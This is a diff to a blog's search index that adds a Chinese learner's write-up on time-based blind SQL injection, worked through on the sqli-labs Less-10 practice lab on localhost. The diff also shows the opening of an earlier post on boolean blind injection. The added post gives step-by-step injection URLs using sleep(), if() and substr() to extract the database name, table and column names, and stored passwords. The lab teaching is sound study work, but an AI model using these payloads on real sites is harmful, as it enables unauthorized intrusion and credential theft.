@@ -1,6 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>时间盲注的学习</title>
+    <url>/2020/03/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="时间盲注的条件"><a href="#时间盲注的条件" class="headerlink" title="时间盲注的条件"></a>时间盲注的条件</h2><p>之前已经学习过了<strong>布尔盲注</strong>，其实<strong>时间盲注</strong>和<strong>布尔盲注</strong>基本上一样，只不过布尔盲注<strong>有回显</strong>，而时间盲注<strong>没有</strong>，其实时间盲注可以解决多种方法的盲注问题。</p>
+<h2 id="学习时间盲注需要用到的函数"><a href="#学习时间盲注需要用到的函数" class="headerlink" title="学习时间盲注需要用到的函数"></a>学习时间盲注需要用到的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sleep()/延迟函数</span><br><span class="line"><span class="keyword">if</span>(condition,<span class="keyword">true</span>,<span class="keyword">false</span>)<span class="comment">//若条件为真 执行true，若条件为假 执行false</span></span><br><span class="line">substring(<span class="string">"string"</span>,strart,length)</span><br></pre></td></tr></table></figure>
+<h2 id="时间盲注的实例"><a href="#时间盲注的实例" class="headerlink" title="时间盲注的实例"></a>时间盲注的实例</h2><p><strong>在这里就用sqli-labs的第10关讲一下</strong><br><strong>首先判断注入点</strong><br>输入代码<br><code>http://localhost/sqli-labs-master/Less-10/?id=1&quot; and sleep(10) --+</code><br>发现会延迟10秒出现结果，说明注入点时”。<br><strong>判断数据库长度</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if(length(database())&gt;5,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>接着爆出数据库名</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
+<p>接着就更改1的值来爆出来名字。<br><strong>爆表名</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
+<p>和上面的一样，更改limit 0，1的值来爆出来名字。<br><strong>和布尔盲注相比就是多了一个if的函数，其他的基本一样。</strong><br><strong>爆字段</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
+<p><strong>爆值</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
+<p>到这里就爆出来了，可以用脚本来进行爆破，由于技术原因就不展示了。<br>奈何本人技术差，一纯手工注入走天下，将来进行脚本学习再补回来。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>布尔盲注初体验</title>
     <url>/2020/03/07/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
     <content><![CDATA[<h2 id="上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！"><a href="#上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！" class="headerlink" title="上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！"></a>上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！</h2><h2 id="了解布尔盲注"><a href="#了解布尔盲注" class="headerlink" title="了解布尔盲注"></a>了解布尔盲注</h2><p><strong>布尔盲注的条件</strong><br>布尔盲注在注入时不会显示具体的信息，即没有显示位，只会返回对或者错误。<br><strong>布尔盲注需要用到的几个函数</strong></p>
